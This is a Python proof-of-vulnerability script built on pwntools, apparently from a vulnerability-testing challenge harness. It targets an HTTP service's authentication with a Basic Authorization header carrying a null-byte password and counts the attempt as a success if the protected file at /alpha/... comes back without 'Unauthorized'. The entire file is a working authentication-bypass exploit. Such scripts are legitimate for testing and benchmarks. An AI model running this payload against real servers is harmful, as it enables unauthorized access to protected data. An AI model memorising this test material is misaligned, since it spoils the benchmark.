import sys
from pwn import *

def handler( signum, frame):
    print('[SUCCESs] sigalrm fired so the POV was likely successful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)

    ## alpha:\x00\x00..
    up = "YWxwaGE6AAAAAAAAAA=="

    data = 'GET /alpha/1621313535460-582898.txt HTTP/1.1\r\n'
    data += 'Host: localhost:3040\r\n'
    data += "Authorization: Basic " + up + '\r\n'
    data += "Accept: */*\r\n\r\n"

    p.send(data)
    
    d = p.readuntil(b'\r\n\r\n').decode('utf-8')

    print(d)

    f = d.find('Content-Length')

    if f == -1:
        print('[ERROR] Pov Failed')
        p.close()
        exit(1)

    length = d[f+15:].split('\r\n')[0]

    l = int(length)

    print('[INFO] Data length: %d' %(l))
    data = p.read(l)

    p.close()

    print(data)
    if data.find(b'Unauthorized') != -1:
        print('[FAIL] Pov failed')
        exit(1)

    print('[SUCCESS] POV Succeeded')

if __name__ == '__main__':
    main()
